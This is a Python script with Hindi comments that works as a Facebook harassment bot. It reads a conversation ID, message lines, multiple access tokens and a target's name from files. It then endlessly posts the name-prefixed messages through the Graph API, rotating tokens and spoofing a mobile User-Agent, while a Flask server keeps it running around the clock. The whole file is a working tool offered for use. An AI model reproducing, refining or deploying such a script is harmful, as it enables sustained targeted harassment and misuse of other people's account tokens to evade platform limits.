import requests
import time
import os
import threading
from flask import Flask

# Flask ऐप इनिशियलाइज़ करें
app = Flask(__name__)

# UptimeRobot और ब्राउज़र के लिए रूट (ताकि सर्वर 24/7 ज़िंदा रहे)
@app.route('/')
def home():
    return "-- SERVER RUNNING>>RAJ MISHRA H3R3"

# आपका ओरिजिनल मैसेज भेजने वाला फंक्शन
def send_messages_from_file():
    try:
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()

        with open('File.txt', 'r') as file:
            messages = file.readlines()

        num_messages = len(messages)

        with open('tokennum.txt', 'r') as file:
            tokens = file.readlines()
        num_tokens = len(tokens)
        max_tokens = min(num_tokens, num_messages)

        with open('hatersname.txt', 'r') as file:
            haters_name = file.read().strip()

        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())
    except FileNotFoundError as e:
        print(f"[!] Error: File not found - {e}")
        return

    def liness():
        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    liness()
                    liness()
                else:
                    print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))
            time.sleep(5) # एरर आने पर 5 सेकंड रुक कर दोबारा ट्राय करेगा

# मैसेज लूप को बैकग्राउंड में चलाने के लिए थ्रेड
def start_background_task():
    send_messages_from_file()

if __name__ == '__main__':
    # 1. बैकग्राउंड थ्रेड स्टार्ट करें (ताकि मैसेज भेजना शुरू हो जाए)
    t = threading.Thread(target=start_background_task)
    t.daemon = True
    t.start()
    
    # 2. Uppcoder जो PORT देगा, उस पर Flask सर्वर रन करें
    port = int(os.environ.get("PORT", 8000))
    app.run(host='0.0.0.0', port=port)
